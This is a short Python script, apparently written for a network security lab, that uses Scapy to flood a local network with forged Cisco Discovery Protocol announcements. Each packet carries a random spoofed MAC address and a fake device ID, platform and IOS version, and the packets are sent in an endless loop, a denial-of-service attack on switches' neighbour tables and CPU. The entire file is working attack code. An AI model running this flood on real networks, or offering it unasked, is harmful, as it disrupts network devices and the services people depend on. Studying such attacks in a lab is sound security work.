#!/usr/bin/env python3
"""
CDP DoS Flood Attack
Autor  : Edgardy Olivero 20250704
Lab    : EGALDITO_LAB
Uso    : sudo python3 cdp_dos.py
"""

from scapy.all import *

load_contrib("cdp")
import random, time, sys, os

IFACE = "eth0"
INTERVALO = 0.01


def rand_mac():
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )


if os.geteuid() != 0:
    sys.exit("Ejecutar como root.")

print("=" * 45)
print("  CDP DoS Flood - Lab EGALDITO_LAB")
print(f"  Interfaz : {IFACE}")
print("  Ctrl+C para detener")
print("=" * 45)

count = 0
start = time.time()

try:
    while True:
        mac = rand_mac()

        pkt = (
            Ether(dst="01:00:0c:cc:cc:cc", src=mac)
            / LLC(dsap=0xAA, ssap=0xAA, ctrl=0x03)  # <-- esto faltaba
            / SNAP(OUI=0x00000C, code=0x2000)  # <-- esto faltaba
            / CDPv2_HDR()
            / CDPMsgDeviceID(val=f"device-{mac}")
            / CDPMsgPortID(iface="GigabitEthernet0/0")
            / CDPMsgCapabilities()
            / CDPMsgPlatform(val="cisco WS-C2960")
            / CDPMsgSoftwareVersion(val="Cisco IOS 15.2")
        )
        sendp(pkt, iface=IFACE, verbose=False)
        count += 1
        elapsed = time.time() - start
        print(
            f"\r[*] Paquetes: {count}  |  {count / elapsed:.0f} pkt/s",
            end="",
            flush=True,
        )
        time.sleep(INTERVALO)

except KeyboardInterrupt:
    print(f"\n[+] Total enviados: {count}")
